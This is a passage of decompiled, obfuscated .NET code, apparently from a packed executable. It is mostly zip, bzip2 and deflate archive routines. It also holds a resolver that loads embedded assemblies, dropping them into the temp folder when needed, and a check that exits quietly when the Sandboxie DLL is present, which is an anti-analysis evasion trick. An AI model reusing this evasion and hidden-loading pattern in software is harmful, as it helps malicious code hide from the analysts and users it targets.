				{
					num += byte_0[int_0++];
					num2 += num;
				}
				while (--num3 != 0);
			}
			num %= Class50.uint_0;
			num2 %= Class50.uint_0;
		}
		return (num2 << 16) | num;
	}

	static int smethod_440(int[] int_0, int[][] int_1, int[] int_2, int[][] int_3, GClass2 gclass2_0)
	{
		int_2[0] = 9;
		int_0[0] = 5;
		int_1[0] = Class44.int_0;
		int_3[0] = Class44.int_1;
		return 0;
	}

	static Stream smethod_441(Stream0 stream0_0)
	{
		return stream0_0.stream_0;
	}

	static void smethod_442(GClass0 gclass0_0)
	{
		Stream archiveStream = gclass0_0.ArchiveStream;
		uint num = (uint)Class6.smethod_568(archiveStream);
		if (num == gclass0_0.int_2)
		{
			int num2 = Class6.smethod_568(archiveStream);
			if (num2 == gclass0_0.long_0)
			{
				num2 = Class6.smethod_568(archiveStream);
				if (num2 != gclass0_0.long_2)
				{
					archiveStream.Seek(-12L, SeekOrigin.Current);
				}
			}
			else
			{
				archiveStream.Seek(-8L, SeekOrigin.Current);
			}
		}
		else
		{
			archiveStream.Seek(-4L, SeekOrigin.Current);
		}
	}

	static void smethod_443(GClass1 gclass1_0, string string_0)
	{
		EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
		if (eventHandler_ != null)
		{
			EventArgs4 e = Class6.smethod_167(string_0, gclass1_0.ArchiveNameForEvent);
			eventHandler_(gclass1_0, e);
		}
	}

	static string smethod_444()
	{
		return Class6.smethod_206();
	}

	static EventArgs4 smethod_445(string string_0, string string_1)
	{
		EventArgs4 eventArgs = new EventArgs4(string_0, Enum6.const_22);
		eventArgs.string_1 = string_1;
		return eventArgs;
	}

	static void smethod_446(string string_0, GClass0 gclass0_0, string string_1)
	{
		Class6.smethod_497(string_0, (Stream)null, string_1, gclass0_0);
	}

	static Assembly smethod_447(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class68.Struct16 @struct = new Class68.Struct16(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "e2NlODEwMTI3LTIzMDItNDcyZS04MTE2LTA2ZTI2YTYxNTZmNX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{98542371-8c60-497f-90d1-06e7bb84eeb8},e2NlODEwMTI3LTIzMDItNDcyZS04MTE2LTA2ZTI2YTYxNTZmNX0=,[z]{98542371-8c60-497f-90d1-06e7bb84eeb8}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			lock (Class68.dictionary_0)
			{
				if (Class68.dictionary_0.ContainsKey(text2))
				{
					return Class68.dictionary_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class6.smethod_426(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class6.MoveFileEx(text5, (string)null, 4);
								Class6.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class68.dictionary_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	static void smethod_448(Stream6 stream6_0)
	{
		Stream6.Class34 class34_ = stream6_0.class34_0;
		stream6_0.int_1 = Class6.smethod_532(stream6_0, 24);
		if (stream6_0.int_1 < 0)
		{
			throw new IOException("BZ_DATA_ERROR");
		}
		if (stream6_0.int_1 > 10 + Class35.int_0 * stream6_0.int_2)
		{
			throw new IOException("BZ_DATA_ERROR");
		}
		Class6.smethod_57(stream6_0);
		byte[] byte_ = class34_.byte_3;
		int num = stream6_0.int_2 * Class35.int_0;
		int num2 = 256;
		while (--num2 >= 0)
		{
			byte_[num2] = (byte)num2;
			class34_.int_0[num2] = 0;
		}
		int num3 = 0;
		int num4 = Class35.int_6 - 1;
		int num5 = stream6_0.int_5 + 1;
		int num6 = Class6.smethod_321(0, stream6_0);
		int num7 = stream6_0.int_3;
		int i = stream6_0.int_4;
		int num8 = -1;
		int num9 = class34_.byte_1[0] & 0xFF;
		int[] array = class34_.int_2[num9];
		int[] array2 = class34_.int_1[num9];
		int[] array3 = class34_.int_3[num9];
		int num10 = class34_.int_4[num9];
		while (num6 != num5)
		{
			if (num6 != Class35.char_0 && num6 != Class35.char_1)
			{
				if (++num8 < num)
				{
					byte b = byte_[num6 - 1];
					class34_.int_0[class34_.byte_0[b] & 0xFF]++;
					class34_.byte_5[num8] = class34_.byte_0[b];
					if (num6 <= 16)
					{
						int num11 = num6 - 1;
						while (num11 > 0)
						{
							byte_[num11] = byte_[--num11];
						}
					}
					else
					{
						Buffer.BlockCopy(byte_, 0, byte_, 1, num6 - 1);
					}
					byte_[0] = b;
					if (num4 == 0)
					{
						num4 = Class35.int_6 - 1;
						num9 = class34_.byte_1[++num3] & 0xFF;
						array = class34_.int_2[num9];
						array2 = class34_.int_1[num9];
						array3 = class34_.int_3[num9];
						num10 = class34_.int_4[num9];
					}
					else
					{
						num4--;
					}
					int num12;
					for (num12 = num10; i < num12; i += 8)
					{
						int num13 = stream6_0.stream_0.ReadByte();
						if (num13 >= 0)
						{
							num7 = (num7 << 8) | num13;
							continue;
						}
						throw new IOException("unexpected end of stream");
					}
					int num14 = (num7 >> i - num12) & ((1 << num12) - 1);
					i -= num12;
					while (num14 > array2[num12])
					{
						num12++;
						for (; i < 1; i += 8)
						{
							int num15 = stream6_0.stream_0.ReadByte();
							if (num15 >= 0)
							{
								num7 = (num7 << 8) | num15;
								continue;
							}
							throw new IOException("unexpected end of stream");
						}
						i--;
						num14 = (num14 << 1) | ((num7 >> i) & 1);
					}
					num6 = array3[num14 - array[num12]];
					continue;
				}
				throw new IOException("block overrun");
			}
			int num16 = -1;
			int num17 = 1;
			while (true)
			{
				if (num6 != Class35.char_0)
				{
					if (num6 != Class35.char_1)
					{
						break;
					}
					num16 += num17 << 1;
				}
				else
				{
					num16 += num17;
				}
				if (num4 == 0)
				{
					num4 = Class35.int_6 - 1;
					num9 = class34_.byte_1[++num3] & 0xFF;
					array = class34_.int_2[num9];
					array2 = class34_.int_1[num9];
					array3 = class34_.int_3[num9];
					num10 = class34_.int_4[num9];
				}
				else
				{
					num4--;
				}
				int num18;
				for (num18 = num10; i < num18; i += 8)
				{
					int num19 = stream6_0.stream_0.ReadByte();
					if (num19 >= 0)
					{
						num7 = (num7 << 8) | num19;
						continue;
					}
					throw new IOException("unexpected end of stream");
				}
				int num20 = (num7 >> i - num18) & ((1 << num18) - 1);
				i -= num18;
				while (num20 > array2[num18])
				{
					num18++;
					for (; i < 1; i += 8)
					{
						int num21 = stream6_0.stream_0.ReadByte();
						if (num21 >= 0)
						{
							num7 = (num7 << 8) | num21;
							continue;
						}
						throw new IOException("unexpected end of stream");
					}
					i--;
					num20 = (num20 << 1) | ((num7 >> i) & 1);
				}
				num6 = array3[num20 - array[num18]];
				num17 <<= 1;
			}
			byte b2 = class34_.byte_0[byte_[0]];
			class34_.int_0[b2 & 0xFF] += num16 + 1;
			while (num16-- >= 0)
			{
				class34_.byte_5[++num8] = b2;
			}
			if (num8 >= num)
			{
				throw new IOException("block overrun");
			}
		}
		stream6_0.int_0 = num8;
		stream6_0.int_4 = i;
		stream6_0.int_3 = num7;
	}

	static string smethod_449(Class2 class2_0)
	{
		return class2_0.string_0;
	}

	static int smethod_450(Class38 class38_0, int int_0)
	{
		int num = class38_0.class39_0.int_3;
		int num2 = class38_0.int_36;
		int num3 = class38_0.int_39;
		int num4 = ((class38_0.int_36 > class38_0.int_23 - Class38.int_16) ? (class38_0.int_36 - (class38_0.int_23 - Class38.int_16)) : 0);
		int num5 = class38_0.class39_0.int_2;
		int int_ = class38_0.int_25;
		int num6 = class38_0.int_36 + Class38.int_15;
		byte b = class38_0.byte_1[num2 + num3 - 1];
		byte b2 = class38_0.byte_1[num2 + num3];
		if (class38_0.int_39 >= class38_0.class39_0.int_0)
		{
			num >>= 2;
		}
		if (num5 > class38_0.int_38)
		{
			num5 = class38_0.int_38;
		}
		do
		{
			int num7 = int_0;
			if (class38_0.byte_1[num7 + num3] != b2 || class38_0.byte_1[num7 + num3 - 1] != b || class38_0.byte_1[num7] != class38_0.byte_1[num2] || class38_0.byte_1[++num7] != class38_0.byte_1[num2 + 1])
			{
				continue;
			}
			num2 += 2;
			num7++;
			while (class38_0.byte_1[++num2] == class38_0.byte_1[++num7] && class38_0.byte_1[++num2] == class38_0.byte_1[++num7] && class38_0.byte_1[++num2] == class38_0.byte_1[++num7] && class38_0.byte_1[++num2] == class38_0.byte_1[++num7] && class38_0.byte_1[++num2] == class38_0.byte_1[++num7] && class38_0.byte_1[++num2] == class38_0.byte_1[++num7] && class38_0.byte_1[++num2] == class38_0.byte_1[++num7] && class38_0.byte_1[++num2] == class38_0.byte_1[++num7] && num2 < num6)
			{
			}
			int num8 = Class38.int_15 - (num6 - num2);
			num2 = num6 - Class38.int_15;
			if (num8 > num3)
			{
				class38_0.int_37 = int_0;
				num3 = num8;
				if (num8 >= num5)
				{
					break;
				}
				b = class38_0.byte_1[num2 + num3 - 1];
				b2 = class38_0.byte_1[num2 + num3];
			}
		}
		while ((int_0 = class38_0.short_0[int_0 & int_] & 0xFFFF) > num4 && --num != 0);
		if (num3 <= class38_0.int_38)
		{
			return num3;
		}
		return class38_0.int_38;
	}

	static int smethod_451(Stream stream_0)
	{
		int num = 0;
		try
		{
			num = Class6.smethod_455("n/a", stream_0);
			if (num == 134695760)
			{
				stream_0.Seek(12L, SeekOrigin.Current);
				num = Class6.smethod_455("n/a", stream_0);
				if (num != 67324752)
				{
					stream_0.Seek(8L, SeekOrigin.Current);
					num = Class6.smethod_455("n/a", stream_0);
					if (num != 67324752)
					{
						stream_0.Seek(-24L, SeekOrigin.Current);
						num = Class6.smethod_455("n/a", stream_0);
						return num;
					}
					return num;
				}
				return num;
			}
			return num;
		}
		catch (BadReadException)
		{
			return num;
		}
	}

	static long smethod_452(Stream4 stream4_0)
	{
		return stream4_0.long_2 + stream4_0.long_0;
	}

	static void smethod_453(int int_0, GClass0 gclass0_0)
	{
		if (int_0 != gclass0_0.int_2 && ((gclass0_0.enum2_0 != Enum2.const_2 && gclass0_0.enum2_0 != Enum2.const_3) || gclass0_0.short_5 != 2))
		{
			throw new BadCrcException("CRC error: the file being extracted appears to be corrupted. " + $"Expected 0x{gclass0_0.int_2:X8}, Actual 0x{int_0:X8}");
		}
		if (gclass0_0.long_2 != 0L && (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3))
		{
			Stream3 stream3_ = gclass0_0.stream_2 as Stream3;
			gclass0_0.class19_0.byte_6 = Class6.smethod_340(stream3_);
			Class19 class19_ = gclass0_0.class19_0;
			Stream archiveStream = gclass0_0.ArchiveStream;
			Class6.smethod_474(archiveStream, class19_);
		}
	}

	static void smethod_454(Class32 class32_0)
	{
		class32_0.gclass3_0.uint_2 = uint.MaxValue;
		class32_0.int_1 = -1;
		class32_0.int_2 = 0;
		class32_0.int_3 = -1;
		int num = 256;
		while (--num >= 0)
		{
			class32_0.class33_0.bool_0[num] = false;
		}
	}

	static int smethod_455(string string_0, Stream stream_0)
	{
		int num = 0;
		byte[] array = new byte[4];
		num = stream_0.Read(array, 0, array.Length);
		if (num != array.Length)
		{
			throw new BadReadException(string.Format(string_0, stream_0.Position));
		}
		return ((array[3] * 256 + array[2]) * 256 + array[1]) * 256 + array[0];
	}

	static GClass0 smethod_456(string string_0, string string_1, GClass1 gclass1_0, Enum10 enum10_0)
	{
		if (string_1 == null)
		{
			string_1 = "";
		}
		return Class6.smethod_313(gclass1_0, string_0, string_1, enum10_0, bool_0: true, 0);
	}

	static void smethod_457(Class32 class32_0)
	{
		bool[] bool_ = class32_0.class33_0.bool_0;
		byte[] byte_ = class32_0.class33_0.byte_6;
		int int_ = class32_0.int_3;
		int num = 256;
		while (--num >= 0)
		{
			bool_[num] = false;
		}
		int num2 = 0;
		int num3 = 0;
		int num4 = 0;
		int num5 = 1;
		while (num4 <= int_)
		{
			if (num2 == 0)
			{
				num2 = (ushort)Class6.smethod_191(num3);
				if (++num3 == 512)
				{
					num3 = 0;
				}
			}
			num2--;
			byte_[num5] ^= ((num2 == 1) ? ((byte)1) : ((byte)0));
			bool_[byte_[num5] & 0xFF] = true;
			num4 = num5;
			num5++;
		}
		class32_0.bool_1 = true;
	}

	static ZipSegmentedStream smethod_458(string string_0, uint uint_0, uint uint_1)
	{
		ZipSegmentedStream zipSegmentedStream = new ZipSegmentedStream();
		zipSegmentedStream.rwMode_0 = ZipSegmentedStream.RwMode.ReadOnly;
		Class6.smethod_395(zipSegmentedStream, uint_0);
		zipSegmentedStream.uint_1 = uint_1;
		zipSegmentedStream.string_0 = string_0;
		ZipSegmentedStream zipSegmentedStream2 = zipSegmentedStream;
		Class6.smethod_662(zipSegmentedStream2);
		return zipSegmentedStream2;
	}

	static GClass0 smethod_459(string string_0, string string_1, GClass1 gclass1_0)
	{
		return Class6.smethod_275(Encoding.Default, gclass1_0, string_1, string_0);
	}

	static void smethod_460(Stream8 stream8_0)
	{
		Class6.smethod_224(stream8_0.class31_0, (byte)23);
		Class6.smethod_224(stream8_0.class31_0, (byte)114);
		Class6.smethod_224(stream8_0.class31_0, (byte)69);
		Class6.smethod_224(stream8_0.class31_0, (byte)56);
		Class6.smethod_224(stream8_0.class31_0, (byte)80);
		Class6.smethod_224(stream8_0.class31_0, (byte)144);
		Class6.smethod_253(stream8_0.class31_0, stream8_0.uint_0);
		Class6.smethod_668(stream8_0.class31_0);
	}

	static int smethod_461(GClass0 gclass0_0, byte[] byte_0, int int_0)
	{
		int_0 += 2;
		gclass0_0.uint_1 = (ushort)(byte_0[int_0++] + byte_0[int_0++] * 256);
		gclass0_0.enum2_0 = Enum2.const_4;
		gclass0_0.enum2_1 = Enum2.const_4;
		return int_0;
	}

	static void smethod_462(GClass1 gclass1_0)
	{
		Class6.smethod_218(gclass1_0);
		gclass1_0.dictionary_0 = new Dictionary<string, GClass0>();
		if (gclass1_0.textWriter_0 != null)
		{
			if (gclass1_0.string_0 == null)
			{
				gclass1_0.textWriter_0.WriteLine("Reading zip from stream...");
			}
			else
			{
				gclass1_0.textWriter_0.WriteLine("Reading zip {0}...", gclass1_0.string_0);
			}
		}
		bool bool_ = true;
		Class8 class8_ = new Class8(gclass1_0);
		GClass0 gClass;
		while ((gClass = Class6.smethod_121(class8_, bool_)) != null)
		{
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("  {0}", gClass.string_1);
			}
			gclass1_0.dictionary_0.Add(gClass.string_1, gClass);
			bool_ = false;
		}
		try
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			GClass0 gClass2;
			while ((gClass2 = Class6.smethod_487(gclass1_0, dictionary)) != null)
			{
				GClass0 gClass3 = gclass1_0.dictionary_0[gClass2.string_1];
				if (gClass3 != null)
				{
					gClass3.string_2 = gClass2.string_2;
					if (gClass2.bool_4)
					{
						Class6.smethod_498(gClass3);
					}
				}
				dictionary.Add(gClass2.string_1, null);
			}
			if (gclass1_0.long_0 > 0L)
			{
				gclass1_0.ReadStream.Seek(gclass1_0.long_0, SeekOrigin.Begin);
			}
			Class6.smethod_213(gclass1_0);
			if (gclass1_0.textWriter_0 != null && !string.IsNullOrEmpty(gclass1_0.string_2))
			{
				gclass1_0.textWriter_0.WriteLine("Zip file Comment: {0}", gclass1_0.string_2);
			}
		}
		catch (ZipException)
		{
		}
		catch (IOException)
		{
		}
		Class6.smethod_522(gclass1_0);
	}

	static int smethod_463(string string_0, GClass1 gclass1_0)
	{
		ICollection<GClass0> collection = Class6.smethod_546(gclass1_0, string_0);
		Class6.smethod_370(collection, gclass1_0);
		return collection.Count;
	}

	static int smethod_464(RNGCryptoServiceProvider rngcryptoServiceProvider_0, int int_0)
	{
		byte[] array = new byte[4];
		int num;
		do
		{
			rngcryptoServiceProvider_0.GetBytes(array);
			num = BitConverter.ToInt32(array, 0) & 0x7FFFFFFF;
		}
		while (num >= int_0 * (int.MaxValue / int_0));
		return num % int_0;
	}

	static void smethod_465(Class38 class38_0, int int_0, int int_1)
	{
		if (class38_0.int_51 > Class38.int_13 - int_1)
		{
			class38_0.short_6 |= (short)((int_0 << class38_0.int_51) & 0xFFFF);
			class38_0.byte_0[class38_0.int_21++] = (byte)class38_0.short_6;
			class38_0.byte_0[class38_0.int_21++] = (byte)(class38_0.short_6 >> 8);
			class38_0.short_6 = (short)((uint)int_0 >> Class38.int_13 - class38_0.int_51);
			class38_0.int_51 += int_1 - Class38.int_13;
		}
		else
		{
			class38_0.short_6 |= (short)((int_0 << class38_0.int_51) & 0xFFFF);
			class38_0.int_51 += int_1;
		}
	}

	static void smethod_466(Enum3 enum3_0, GClass0 gclass0_0)
	{
		gclass0_0.ExtractExistingFile = enum3_0;
		Class6.smethod_497((string)null, (Stream)null, ".", gclass0_0);
	}

	static void smethod_467(GClass0 gclass0_0, Stream stream_0, Stream4 stream4_0, Stream stream_1, Stream stream_2, Stream13 stream13_0)
	{
		if (stream13_0 != null)
		{
			stream13_0.Close();
			if (stream_2 is Stream9)
			{
				stream_2.Close();
			}
			else if (stream_2 is Stream7)
			{
				stream_2.Close();
			}
			else if (stream_2 is Stream8)
			{
				stream_2.Close();
			}
			else if (stream_2 is Stream11)
			{
				stream_2.Close();
			}
			stream_1.Flush();
			stream_1.Close();
			gclass0_0.int_4 = 0;
			gclass0_0.long_2 = Class6.smethod_122(stream13_0);
			if (stream_1 is Stream3 stream3_ && gclass0_0.long_2 > 0L)
			{
				stream_0.Write(Class6.smethod_340(stream3_), 0, 10);
				gclass0_0.int_4 += 10;
			}
			gclass0_0.long_1 = stream4_0.long_0;
			gclass0_0.long_0 = gclass0_0.long_1;
			gclass0_0.int_2 = Class6.smethod_336(stream13_0);
			Class6.smethod_425(gclass0_0);
		}
	}

	static int smethod_468(Class53 class53_0)
	{
		return class53_0.int_0;
	}

	static int smethod_469(Class73.Stream14 stream14_0)
	{
		return stream14_0.ReadByte() | (stream14_0.ReadByte() << 8);
	}

	static int smethod_470(bool bool_0, GClass2 gclass2_0)
	{
		return Class6.smethod_417(bool_0, gclass2_0, gclass2_0.int_4);
	}

	static void smethod_471(Enum6 enum6_0, EventArgs0 eventArgs0_0)
	{
		eventArgs0_0.enum6_0 = enum6_0;
	}

	static void smethod_472(bool bool_0, GClass1 gclass1_0, GClass0 gclass0_0)
	{
		EventHandler<EventArgs1> eventHandler_ = gclass1_0.eventHandler_1;
		if (eventHandler_ != null)
		{
			EventArgs1 eventArgs;
			if (!bool_0)
			{
				string archiveNameForEvent = gclass1_0.ArchiveNameForEvent;
				int count = gclass1_0.dictionary_0.Count;
				eventArgs = Class6.smethod_676(gclass0_0, archiveNameForEvent, count);
			}
			else
			{
				eventArgs = Class6.smethod_98(gclass1_0.ArchiveNameForEvent, gclass1_0.dictionary_0.Count);
			}
			EventArgs1 e = eventArgs;
			eventHandler_(gclass1_0, e);
		}
	}

	static object smethod_473(Type type_0, string string_0)
	{
		return Class6.smethod_238(string_0, type_0, bool_0: false);
	}

	static void smethod_474(Stream stream_0, Class19 class19_0)
	{
		bool flag = false;
		class19_0.byte_4 = new byte[10];
		stream_0.Read(class19_0.byte_4, 0, class19_0.byte_4.Length);
		if (class19_0.byte_4.Length != class19_0.byte_6.Length)
		{
			flag = true;
		}
		if (!flag)
		{
			for (int i = 0; i < class19_0.byte_4.Length; i++)
			{
				if (class19_0.byte_4[i] != class19_0.byte_6[i])
				{
					flag = true;
				}
			}
		}
		if (flag)
		{
			throw new BadStateException("The MAC does not match.");
		}
	}

	static void smethod_475()
	{
		try
		{
			if (Class6.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
			{
				Environment.Exit(0);
			}
		}
		catch
		{
		}
	}

	static Class21 smethod_476(GClass0 gclass0_0, string string_0)
	{
		Stream stream_ = gclass0_0.stream_0;
		gclass0_0.byte_3 = new byte[12];
		byte[] byte_ = gclass0_0.byte_3;
		Class21 @class = new Class21();
		if (string_0 == null)
		{
			throw new BadPasswordException("This entry requires a password.");
		}
		Class6.smethod_478(@class, string_0);
		Class6.smethod_236(stream_, byte_);
		byte[] array = Class6.smethod_505(byte_, byte_.Length, @class);
		if (array[11] != (byte)((gclass0_0.int_2 >> 24) & 0xFF))
		{
			if ((gclass0_0.short_7 & 8) != 8)
			{
				throw new BadPasswordException("The password did not match.");
			}
			if (array[11] != (byte)((gclass0_0.int_1 >> 8) & 0xFF))
			{
				throw new BadPasswordException("The password did not match.");
			}
		}
		return @class;
	}

	static string smethod_477(Class61 class61_0)
	{
		return class61_0.string_2;
	}

	static void smethod_478(Class21 class21_0, string string_0)
	{
		byte[] array = Class6.smethod_326(string_0);
		for (int i = 0; i < string_0.Length; i++)
		{
			Class6.smethod_583(class21_0, array[i]);
		}
	}

	static GClass0 smethod_479(Stream stream_0, string string_0, GClass1 gclass1_0)
	{
		GClass0 gclass0_ = Class6.smethod_205(string_0, stream_0);
		DateTime now = DateTime.Now;
		DateTime now2 = DateTime.Now;
		DateTime now3 = DateTime.Now;
		Class6.smethod_520(now, now3, now2, gclass0_);
		if (gclass1_0.textWriter_0 != null)
		{
			gclass1_0.textWriter_0.WriteLine("adding {0}...", string_0);
		}
		return Class6.smethod_108(gclass1_0, gclass0_);
	}

	static ICollection<GClass0> smethod_480(GClass1 gclass1_0, Class16 class16_0, string string_0)
	{
		if (gclass1_0 == null)
		{
			throw new ArgumentNullException("zip");
		}
		List<GClass0> list = new List<GClass0>();
		string text = string_0?.Replace("/", "\\");
		if (text != null)
		{
			while (text.EndsWith("\\"))
			{
				text = text.Substring(0, text.Length - 1);
			}
		}
		using IEnumerator<GClass0> enumerator = gclass1_0.System_002ECollections_002EGeneric_002EIEnumerable_003Cns5_002EGClass0_003E_002EGetEnumerator();
		while (enumerator.MoveNext())
		{
			GClass0 current = enumerator.Current;
			if ((string_0 == null || Path.GetDirectoryName(current.string_1) == string_0 || Path.GetDirectoryName(current.string_1) == text) && Class6.smethod_163(class16_0, current))
			{
				list.Add(current);
			}
		}
		return list;
	}

	static Encoding smethod_481()
	{
		return Encoding.GetEncoding("IBM437");
	}

	static int smethod_482(Class73.Class76 class76_0, Class73.Class75 class75_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class76_0.int_1), Class6.smethod_343(class75_0));
		int num = 32768 - class76_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class6.smethod_82(class75_0, class76_0.byte_0, class76_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class6.smethod_82(class75_0, class76_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class6.smethod_82(class75_0, class76_0.byte_0, class76_0.int_0, int_0);
		}
		class76_0.int_0 = (class76_0.int_0 + num2) & 0x7FFF;
		class76_0.int_1 += num2;
		return num2;
	}

	static void smethod_483(Stream7 stream7_0)
	{
		try
		{
			Class6.smethod_162(stream7_0.class32_0);
			stream7_0.uint_0 = (stream7_0.uint_0 << 1) | (stream7_0.uint_0 >> 31);
			stream7_0.uint_0 ^= stream7_0.class32_0.method_0();
			Class6.smethod_356(stream7_0);
		}
		finally
		{
			stream7_0.stream_0 = null;
			stream7_0.class32_0 = null;
			stream7_0.class31_0 = null;
		}
	}

	static void smethod_484(GClass1 gclass1_0)
	{
		EventHandler<EventArgs3> eventHandler_ = gclass1_0.eventHandler_0;
		if (eventHandler_ != null)
		{
			EventArgs3 e = Class6.smethod_22(gclass1_0.ArchiveNameForEvent);
			eventHandler_(gclass1_0, e);
		}
	}

	[DllImport("kernel32.dll")]
	static extern IntPtr GetModuleHandle(string string_0);

	static ICryptoTransform smethod_485(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	static int smethod_486(GClass2 gclass2_0, Enum19 enum19_0)
	{
		if (gclass2_0.class38_0 == null)
		{
			throw new GException0("No Deflate State!");
		}
		return Class6.smethod_90(gclass2_0.class38_0, enum19_0);
	}

	static GClass0 smethod_487(GClass1 gclass1_0, Dictionary<string, object> dictionary_0)
	{
		Stream readStream = gclass1_0.ReadStream;
		Encoding encoding = ((gclass1_0.enum9_0 == Enum9.const_3) ? gclass1_0.encoding_0 : GClass1.encoding_1);
		int num = Class6.smethod_246(readStream);
		if (num != 33639248)
		{
			readStream.Seek(-4L, SeekOrigin.Current);
			if (num != 101010256L && num != 101075792L && num != 67324752)
			{
				throw new BadReadException($"  Bad signature (0x{num:X8}) at position 0x{readStream.Position:X8}");
			}
			return null;
		}
		int num2 = 46;
		byte[] array = new byte[42];
		int num3 = readStream.Read(array, 0, array.Length);
		if (num3 != array.Length)
		{
			return null;
		}
		GClass0 gClass = new GClass0();
		gClass.AlternateEncoding = encoding;
		gClass.enum0_0 = Enum0.const_3;
		gClass.class8_0 = new Class8(gclass1_0);
		gClass.short_0 = (short)(array[0] + array[1] * 256);
		gClass.short_6 = (short)(array[2] + array[3] * 256);
		gClass.short_7 = (short)(array[4] + array[5] * 256);
		gClass.short_8 = (short)(array[6] + array[7] * 256);
		gClass.int_1 = array[8] + array[9] * 256 + array[10] * 256 * 256 + array[11] * 256 * 256 * 256;
		gClass.dateTime_0 = Class6.smethod_6(gClass.int_1);
		gClass.enum7_0 |= Enum7.flag_1;
		gClass.int_2 = array[12] + array[13] * 256 + array[14] * 256 * 256 + array[15] * 256 * 256 * 256;
		gClass.long_0 = (uint)(array[16] + array[17] * 256 + array[18] * 256 * 256 + array[19] * 256 * 256 * 256);
		gClass.long_2 = (uint)(array[20] + array[21] * 256 + array[22] * 256 * 256 + array[23] * 256 * 256 * 256);
		gClass.short_9 = gClass.short_8;
		gClass.short_2 = (short)(array[24] + array[25] * 256);
		gClass.short_3 = (short)(array[26] + array[27] * 256);
		gClass.short_4 = (short)(array[28] + array[29] * 256);
		gClass.uint_0 = (uint)(array[30] + array[31] * 256);
		gClass.short_1 = (short)(array[32] + array[33] * 256);
		gClass.int_0 = array[34] + array[35] * 256 + array[36] * 256 * 256 + array[37] * 256 * 256 * 256;
		gClass.long_4 = (uint)(array[38] + array[39] * 256 + array[40] * 256 * 256 + array[41] * 256 * 256 * 256);
		gClass.bool_14 = (gClass.short_1 & 1) == 1;
		array = new byte[gClass.short_2];
		num3 = readStream.Read(array, 0, array.Length);
		num2 += num3;
		if ((gClass.short_7 & 0x800) == 2048)
		{
			gClass.string_1 = Class6.smethod_102(array);
		}
		else
		{
			gClass.string_1 = Class6.smethod_408(encoding, array);
		}
		while (dictionary_0.ContainsKey(gClass.string_1))
		{
			gClass.string_1 = Class6.smethod_67(gClass.string_1);
			gClass.bool_6 = true;
		}
		if (gClass.AttributesIndicateDirectory)
		{
			Class6.smethod_498(gClass);
		}
		else if (gClass.string_1.EndsWith("/"))
		{
			Class6.smethod_498(gClass);
		}
		gClass.long_1 = gClass.long_0;
		if ((gClass.short_7 & 1) == 1)
		{
			gClass.enum2_0 = Enum2.const_1;
			gClass.enum2_1 = Enum2.const_1;
			gClass.bool_8 = true;
		}
		if (gClass.short_3 > 0)
		{
			gClass.bool_10 = gClass.long_0 == 4294967295L || gClass.long_2 == 4294967295L || gClass.long_4 == 4294967295L;
			num2 += Class6.smethod_518(gClass.short_3, gClass, readStream);
			gClass.long_1 = gClass.long_0;
		}
		if (gClass.enum2_0 == Enum2.const_1)
		{
			gClass.long_1 -= 12L;
		}
		else if (gClass.enum2_0 == Enum2.const_2 || gClass.enum2_0 == Enum2.const_3)
		{
			gClass.long_1 = gClass.long_0 - (Class6.smethod_75(gClass.enum2_0) + 10);
			gClass.int_4 = 10;
		}
		if ((gClass.short_7 & 8) == 8)
		{
			if (gClass.bool_10)
			{
				gClass.int_4 += 24;
			}
			else
			{
				gClass.int_4 += 16;
			}
		}
		gClass.AlternateEncoding = (((gClass.short_7 & 0x800) == 2048) ? Encoding.UTF8 : encoding);
		gClass.AlternateEncodingUsage = Enum9.const_3;
		if (gClass.short_4 > 0)
		{
			array = new byte[gClass.short_4];
			num3 = readStream.Read(array, 0, array.Length);
			num2 += num3;
			if ((gClass.short_7 & 0x800) == 2048)
			{
